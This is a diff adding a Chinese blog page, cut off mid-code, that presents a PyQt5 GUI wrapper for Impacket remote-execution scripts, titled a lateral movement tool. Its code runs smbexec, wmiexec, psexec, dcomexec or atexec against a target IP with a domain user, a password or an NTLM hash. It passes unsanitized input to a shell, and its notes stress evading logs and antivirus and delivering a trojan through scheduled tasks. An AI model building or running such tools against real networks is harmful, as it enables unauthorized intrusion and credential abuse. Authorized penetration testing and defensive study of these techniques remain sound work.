@@ -1,0 +1,646 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suuuu">
+  <meta name="keywords" content="blog">
+  
+    <meta name="description" content="本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。 使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。如果自用需要修改的地方：将python38改成自己的python环境 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Impacket-GUI开发">
+<meta property="og:url" content="https://www.susec.xyz/2025/01/29/Impacket-GUI%E5%BC%80%E5%8F%91/index.html">
+<meta property="og:site_name" content="suuuu&#39;s blog">
+<meta property="og:description" content="本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。 使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。如果自用需要修改的地方：将python38改成自己的python环境 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200502977.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200552816.png">
+<meta property="article:published_time" content="2025-01-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-22T12:18:30.921Z">
+<meta property="article:author" content="suuuu">
+<meta property="article:tag" content="开发">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200502977.png">
+  
+  
+  
+  <title>Impacket-GUI开发 - suuuu&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suuuu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/BlackRoses.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Impacket-GUI开发"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-29 00:00" pubdate>
+          2025年1月29日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Impacket-GUI开发</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。 使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。<br>如果自用需要修改的地方：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200502977.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>将python38改成自己的python环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QWidget, QVBoxLayout, QLineEdit, QPushButton, QLabel<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmbExecGUI</span>(<span class="hljs-title class_ inherited__">QWidget</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <br>        self.initUI()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initUI</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 设置窗口标题和大小</span><br>        self.setWindowTitle(<span class="hljs-string">&#x27;SMBExec GUI&#x27;</span>)<br>        self.setGeometry(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">400</span>, <span class="hljs-number">300</span>)<br>        <br>        <span class="hljs-comment"># 创建布局</span><br>        layout = QVBoxLayout()<br><br>        <span class="hljs-comment"># 创建控件</span><br>        self.domain_username_input = QLineEdit(self)<br>        self.domain_username_input.setPlaceholderText(<span class="hljs-string">&#x27;domain/username:0day/sqladmin&#x27;</span>)<br>        <br>        self.password_input = QLineEdit(self)<br>        self.password_input.setPlaceholderText(<span class="hljs-string">&#x27;password:admin!@#45&#x27;</span>)<br>        self.password_input.setEchoMode(QLineEdit.Password)  <span class="hljs-comment"># 隐藏密码</span><br>        <br>        self.ip_input = QLineEdit(self)<br>        self.ip_input.setPlaceholderText(<span class="hljs-string">&#x27;ip:192.168.3.142&#x27;</span>)<br>        <br>        self.result_label = QLabel(<span class="hljs-string">&#x27;Result will be shown here...&#x27;</span>, self)<br>        <br>        self.execute_button = QPushButton(<span class="hljs-string">&#x27;Execute&#x27;</span>, self)<br>        self.execute_button.clicked.connect(self.execute_command)<br><br>        <span class="hljs-comment"># 将控件添加到布局</span><br>        layout.addWidget(self.domain_username_input)<br>        layout.addWidget(self.password_input)<br>        layout.addWidget(self.ip_input)<br>        layout.addWidget(self.execute_button)<br>        layout.addWidget(self.result_label)<br><br>        <span class="hljs-comment"># 设置窗口的布局</span><br>        self.setLayout(layout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 获取输入的内容</span><br>        domain_username = self.domain_username_input.text()<br>        password = self.password_input.text()<br>        ip = self.ip_input.text()<br><br>        <span class="hljs-comment"># 格式化命令</span><br>        <span class="hljs-keyword">if</span> domain_username <span class="hljs-keyword">and</span> password <span class="hljs-keyword">and</span> ip:<br>            command = <span class="hljs-string">f&quot;python38 smbexec.py <span class="hljs-subst">&#123;domain_username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span>&quot;</span><br>            <br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 执行命令并捕获输出</span><br>                result = subprocess.run(command, shell=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br>                <br>                <span class="hljs-comment"># 判断执行结果</span><br>                <span class="hljs-keyword">if</span> result.returncode == <span class="hljs-number">0</span>:<br>                    self.result_label.setText(<span class="hljs-string">f&quot;Success: <span class="hljs-subst">&#123;result.stdout&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    self.result_label.setText(<span class="hljs-string">f&quot;Failed: <span class="hljs-subst">&#123;result.stderr&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                self.result_label.setText(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.result_label.setText(<span class="hljs-string">&quot;Please fill in all fields.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = QApplication(sys.argv)<br>    ex = SmbExecGUI()<br>    ex.show()<br>    sys.exit(app.exec_())<br><br></code></pre></td></tr></table></figure>
+
+<p>自用成品</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QLabel, QPushButton, QRadioButton, QButtonGroup, QTextEdit<br><span class="hljs-keyword">from</span> PyQt5.QtGui <span class="hljs-keyword">import</span> QIcon<br><span class="hljs-keyword">import</span> webbrowser<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmbExecGUI</span>(<span class="hljs-title class_ inherited__">QWidget</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.initUI()<br>        self.selected_module = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initUI</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 设置窗口标题和大小</span><br>        self.setWindowTitle(<span class="hljs-string">&#x27;横向移动工具 - by suuuu&#x27;</span>)<br>        self.setGeometry(<span class="hljs-number">600</span>, <span class="hljs-number">400</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">800</span>)<br>        self.setWindowIcon(QIcon(<span class="hljs-string">&#x27;ico.jpg&#x27;</span>))<br><br>        <span class="hljs-comment"># 创建布局</span><br>        layout = QVBoxLayout()<br><br>        <span class="hljs-comment"># 创建顶部模块选择布局</span><br>        self.module_label = QLabel(<span class="hljs-string">&#x27;请选择攻击模块：&#x27;</span>, self)<br>        self.smbexec_button = QRadioButton(<span class="hljs-string">&#x27;SMBExec&#x27;</span>, self)<br>        self.wmiexec_button = QRadioButton(<span class="hljs-string">&#x27;WMIExec&#x27;</span>, self)<br>        self.dcomexec_button = QRadioButton(<span class="hljs-string">&#x27;DCOMExec&#x27;</span>, self)<br>        self.psexec_button = QRadioButton(<span class="hljs-string">&#x27;PsExec&#x27;</span>, self)<br>        self.atexec_button = QRadioButton(<span class="hljs-string">&#x27;AtExec&#x27;</span>, self)<br>        self.tips_button = QRadioButton(<span class="hljs-string">&#x27;小贴士&#x27;</span>, self)<br><br>        <span class="hljs-comment"># 创建按钮组，确保每次只能选择一个模块</span><br>        self.module_group = QButtonGroup(self)<br>        self.module_group.addButton(self.smbexec_button)<br>        self.module_group.addButton(self.wmiexec_button)<br>        self.module_group.addButton(self.dcomexec_button)<br>        self.module_group.addButton(self.psexec_button)<br>        self.module_group.addButton(self.atexec_button)<br>        self.module_group.addButton(self.tips_button)<br><br>        <span class="hljs-comment"># 默认没有选中</span><br>        self.smbexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.wmiexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.dcomexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.psexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.atexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.tips_button.setChecked(<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-comment"># 创建模块选择布局</span><br>        module_layout = QHBoxLayout()<br>        module_layout.addWidget(self.smbexec_button)<br>        module_layout.addWidget(self.wmiexec_button)<br>        module_layout.addWidget(self.dcomexec_button)<br>        module_layout.addWidget(self.psexec_button)<br>        module_layout.addWidget(self.atexec_button)<br>        module_layout.addWidget(self.tips_button)<br><br>        <span class="hljs-comment"># 添加模块选择部分到主布局</span><br>        layout.addWidget(self.module_label)<br>        layout.addLayout(module_layout)<br><br>        <span class="hljs-comment"># 创建其他输入控件</span><br>        self.domain_username_label = QLabel(<span class="hljs-string">&#x27;domain/username:&#x27;</span>, self)<br>        self.domain_username_input = QLineEdit(self)<br>        self.domain_username_input.setPlaceholderText(<span class="hljs-string">&#x27;0day/sqladmin,域名/用户名&#x27;</span>)<br><br>        self.password_label = QLabel(<span class="hljs-string">&#x27;password:&#x27;</span>, self)<br>        self.password_input = QLineEdit(self)<br>        self.password_input.setPlaceholderText(<span class="hljs-string">&#x27;admin!@#45，明文密码&#x27;</span>)<br><br>        self.hash_label = QLabel(<span class="hljs-string">&#x27;hash:&#x27;</span>, self)<br>        self.hash_input = QLineEdit(self)<br>        self.hash_input.setPlaceholderText(<span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c，目前只支持NTLM Hash&#x27;</span>)<br><br>        self.ip_label = QLabel(<span class="hljs-string">&#x27;ip:&#x27;</span>, self)<br>        self.ip_input = QLineEdit(self)<br>        self.ip_input.setPlaceholderText(<span class="hljs-string">&#x27;192.168.3.142，指定主机IP&#x27;</span>)<br>        <br>         <span class="hljs-comment"># 新增命令输入框</span><br>        self.command_label = QLabel(<span class="hljs-string">&#x27;Command:&#x27;</span>, self)<br>        self.command_input = QLineEdit(self)<br>        self.command_input.setPlaceholderText(<span class="hljs-string">&#x27;whoami,  需要执行的命令，目前只支持atexec&#x27;</span>)<br><br>        <span class="hljs-comment"># 使用 QTextEdit 替换 QLabel</span><br>        self.result_label = QTextEdit(self)<br>        self.result_label.setReadOnly(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 设置为只读</span><br>        self.result_label.setLineWrapMode(QTextEdit.NoWrap) <span class="hljs-comment"># 取消自动换行</span><br>        <br>        self.tips_text_edit = QTextEdit(self)  <span class="hljs-comment"># Tips模块的文本编辑器</span><br>        self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 初始隐藏</span><br><br>        self.execute_button = QPushButton(<span class="hljs-string">&#x27;执行&#x27;</span>, self)<br>        self.execute_button.clicked.connect(self.execute_command)<br><br>        <span class="hljs-comment"># 新增打开浏览器的按钮</span><br>        self.browser_button = QPushButton(<span class="hljs-string">&#x27;打开博客&#x27;</span>, self)<br>        self.browser_button.clicked.connect(self.open_browser)<br><br>        <span class="hljs-comment"># 添加其他控件到布局</span><br>        layout.addWidget(self.domain_username_label)<br>        layout.addWidget(self.domain_username_input)<br>        layout.addWidget(self.password_label)<br>        layout.addWidget(self.password_input)<br>        layout.addWidget(self.hash_label)<br>        layout.addWidget(self.hash_input)<br>        layout.addWidget(self.ip_label)<br>        layout.addWidget(self.ip_input)<br>        layout.addWidget(self.command_label)  <span class="hljs-comment"># 添加命令标签</span><br>        layout.addWidget(self.command_input)   <span class="hljs-comment"># 添加命令输入框</span><br>        layout.addWidget(self.execute_button)<br>        layout.addWidget(self.result_label)<br>        layout.addWidget(self.tips_text_edit)  <span class="hljs-comment"># 将文本编辑器添加到布局</span><br>        layout.addWidget(self.browser_button)  <span class="hljs-comment"># 添加打开浏览器的按钮</span><br><br>        <span class="hljs-comment"># 绑定按钮点击事件，切换模块和显示相应说明</span><br>        self.smbexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;smbexec.py&#x27;</span>, <span class="hljs-string">&#x27;SMB利用\n\n1. 445端口开放&#x27;</span>))<br>        self.wmiexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;wmiexec.py&#x27;</span>, <span class="hljs-string">&#x27;WMI利用\n\n1. WMI服务开启，端口135，默认开启\n2. 防火墙允许135,445等端口通信\n3. 该方法不会在目标日志系统留下痕迹&#x27;</span>))<br>        self.dcomexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;dcomexec.py&#x27;</span>, <span class="hljs-string">&#x27;DCOM利用\n\n1.默认情况下，只有管理员才能通过DCOM使用有效账户与远程机器进行交互&#x27;</span>))<br>        self.psexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;psexec.py&#x27;</span>, <span class="hljs-string">&#x27;Ps利用\n\n1.PsExec是WIndows提供的工具，所以杀毒软件将其列入白名单中&#x27;</span>))<br>        self.atexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;atexec.py&#x27;</span>, <span class="hljs-string">&#x27;At利用\n\n1. 步骤分别为\n传递木马，创建计划任务，执行计划任务，删除计划任务，运行木马\n这里的步骤很敏感，所以一般不用\n2. 需要目标机器允许当前用户通过at命令创建任务&#x27;</span>))<br>        self.tips_button.toggled.connect(self.show_tips)<br><br>        <span class="hljs-comment"># 设置初始显示</span><br>        self.set_module(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br>        <span class="hljs-comment"># 设置窗口的布局</span><br>        self.setLayout(layout)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_browser</span>(<span class="hljs-params">self</span>):<br>       webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;https://e1evensu.github.io/&#x27;</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_module</span>(<span class="hljs-params">self, module_name, usage_info</span>):<br>        <span class="hljs-comment"># 更新模块的描述和说明</span><br>        self.selected_module = module_name<br>        self.result_label.setPlainText(usage_info)<br>        self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)<br>        <br>        <span class="hljs-comment"># 隐藏输入控件</span><br>        self.domain_username_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.domain_username_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.password_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.password_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.hash_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.hash_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.ip_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.ip_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.command_label.setVisible(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 显示命令标签</span><br>        self.command_input.setVisible(<span class="hljs-literal">True</span>) <span class="hljs-comment"># 显示命令输入框</span><br>        self.execute_button.setVisible(<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show_tips</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> 